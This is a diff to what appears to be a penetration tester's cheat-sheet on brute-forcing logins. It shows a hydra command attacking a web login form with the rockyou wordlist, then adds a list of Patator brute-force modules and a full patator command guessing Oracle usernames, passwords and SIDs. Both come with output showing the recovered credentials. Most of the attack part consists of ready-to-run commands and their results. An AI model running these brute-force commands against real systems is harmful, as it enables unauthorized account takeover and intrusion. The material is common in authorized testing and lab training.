@@ -1,4 +1,5 @@
-#Bruteforce login
+Bruteforce
+----------
 
 #Use burpsuite to capture an initial login once you have a user name (username/fakepassword)
 # Get PHPSESSID/CSRF Token using burpsuite
@@ -29,3 +30,57 @@ hydra -l harvey -P rockyou8.txt -t 60 hostname.local http-form-post "/simple_cha
 
 [STATUS] 996.00 tries/min, 996 tries in 00:01h, 9605454 to do in 160:45h, 60 active
 [80][http-post-form] host: hostname.local   login: harvey   password: Password1
+
+
+#Patador uses Fuzzing logic to bruteforce multihosts using files
+  + ftp_login     : Brute-force FTP
+  + ssh_login     : Brute-force SSH
+  + telnet_login  : Brute-force Telnet
+  + smtp_login    : Brute-force SMTP
+  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
+  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
+  + finger_lookup : Enumerate valid users using Finger
+  + http_fuzz     : Brute-force HTTP
+  + rdp_gateway   : Brute-force RDP Gateway
+  + ajp_fuzz      : Brute-force AJP
+  + pop_login     : Brute-force POP3
+  + pop_passd     : Brute-force poppassd (http://netwinsite.com/poppassd/)
+  + imap_login    : Brute-force IMAP4
+  + ldap_login    : Brute-force LDAP
+  + smb_login     : Brute-force SMB
+  + smb_lookupsid : Brute-force SMB SID-lookup
+  + rlogin_login  : Brute-force rlogin
+  + vmauthd_login : Brute-force VMware Authentication Daemon
+  + mssql_login   : Brute-force MSSQL
+  + oracle_login  : Brute-force Oracle
+  + mysql_login   : Brute-force MySQL
+  + mysql_query   : Brute-force MySQL queries
+  + rdp_login     : Brute-force RDP (NLA)
+  + pgsql_login   : Brute-force PostgreSQL
+  + vnc_login     : Brute-force VNC
+  + dns_forward   : Forward DNS lookup
+  + dns_reverse   : Reverse DNS lookup
+  + snmp_login    : Brute-force SNMP v1/2/3
+  + ike_enum      : Enumerate IKE transforms
+  + unzip_pass    : Brute-force the password of encrypted ZIP files
+  + keystore_pass : Brute-force the password of Java keystore files
+  + sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases
+  + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes
+  + tcp_fuzz      : Fuzz TCP services
+  + dummy_test    : Testing module
+#-x ignores out the errors
+#
+#user=FILE1 1=username.txt
+#password=FILE0 0=password.txt
+#sid=FILE2 2=sid.txt
+#
+#-x ignore:code=ORA-01017 -x ignore:code=ORA-12505
+#username(scott) password(tiger) sid (XE)
+
+patator oracle_login host=x.x.x.x user=FILE1 1=username.txt sid=FILE2 password=FILE0 0=password.txt -x ignore:code=ORA-01017 -x ignore:code=ORA-12505 2=sid.txt
+
+21:01:02 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2019-11-10 21:01 UTC
+21:01:02 patator    INFO -                                                                              
+21:01:02 patator    INFO - code      size   time | candidate                          |   num | mesg
+21:01:02 patator    INFO - -----------------------------------------------------------------------------
+21:01:04 patator    INFO - 0         10    1.885 | tiger:scott:XE                     |     2 | 11.2.0.2.0
